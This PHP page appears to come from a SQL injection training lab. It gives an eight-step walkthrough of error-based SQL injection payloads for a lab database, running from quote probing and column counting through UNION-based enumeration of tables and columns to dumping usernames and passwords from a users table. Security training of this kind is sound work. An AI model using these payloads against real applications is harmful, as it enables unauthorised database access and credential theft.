<?php
	$menu_main = 'solutions';
	$menu_sub = 'error_based_solutions';
	include_once('../php-inc/settings.php');
	include_once('../php-inc/header.php');
?>
      
      <!-- **********************************************************************************************************************************************************
      MAIN CONTENT
      *********************************************************************************************************************************************************** -->
      <!--main content start-->
      <section id="main-content">
          <section class="wrapper">
          	<h3><i class="fa fa-angle-right"></i> Error Based SQL Injection Solutions</h3>
				<div class="row">
				
	                  <div class="col-md-12">
	                  	  <div class="content-panel">
	                  	  	  <h4><i class="fa fa-angle-right"></i> Example1</h4>
	                  	  	  <hr>
		                      <table class="table">
		                          <thead>
		                          <tr>
		                              <th>#</th>
		                              <th>Code &amp Details</th>
		                          </tr>
		                          </thead>
		                          <tbody>
		                          	<tr>
		                              <td>1</td>
		                              <td><strong>?id=1\</strong><br/><br/>
		                              	By putting an escape character at the end we can check out if the data provided is enclosed within single quote, double quote, bracket etc.
		                              </td>
		                          	</tr>
			                      	<tr>
			                              <td>2</td>
			                              <td><strong>?id=1'</strong><br/><br/>
			                              	Displays an error as the id is written as id='$id'. Putting an extra quote it breaks the code. From the error it is possible we can get the RDBMS working in the background.
			                              </td>
			                      	</tr>	
			                      	<tr>
			                              <td>3</td>
			                              <td><strong>?id=1' --+</strong><br/><br/>
			                              	Will fix the query and commnent out rest of the part.
			                              </td>
			                      	</tr>	
			                      	<tr>
			                              <td>4</td>
			                              <td><strong>?id=1' ORDER by 1,2,3,4,5 --+</strong><br/><br/>
			                              	To check out the application is dealing with how many columns. If it gives an error we will decrease number of columns and check out or will increase the number of columns until it gives an error.
			                              </td>
			                      	</tr>	
			                      	<tr>
			                              <td>5</td>
			                              <td><strong>?id=-1' UNION SELECT 1,@@version,database() --+</strong><br/><br/>
			                              	To get an output from our query the first query should not return any value so placed -1 and @@version will display the current version of DBMS and database() will give the current database. The left side and right side of the query must match.
			                              </td>
			                      	</tr>	
			                      	<tr>
			                              <td>6</td>
			                              <td><strong>?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() --+</strong><br/><br/>
			                              	This query will return all the table names of the current database.
			                              </td>
			                      	</tr>	
			                      	<tr>
			                              <td>7</td>
			                              <td><strong>?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema ='sqlilabs' AND table_name='users' --+</strong><br/><br/>
			                              	This query will return all the columns of the table users from the database sqlilabs.
			                              </td>
			                      	</tr>
			                      	<tr>
			                              <td>8</td>
			                              <td><strong>?id=-1' UNION SELECT 1,group_concat(username SEPARATOR '-'),group_concat(password SEPARATOR '-') FROM users --+</strong><br/><br/>
			                              	This query will display all the username beside Your Login name and password beside Your Password.
			                              </td>
			                      	</tr>			                          
		                          </tbody>
		                      </table>
	                  	  </div><! --/content-panel -->
	                  </div><!-- /col-md-12 -->
	      			</div>
          </section>
      </section>

      <!--main content end-->

<?php
	include_once('../php-inc/footer.php');
?>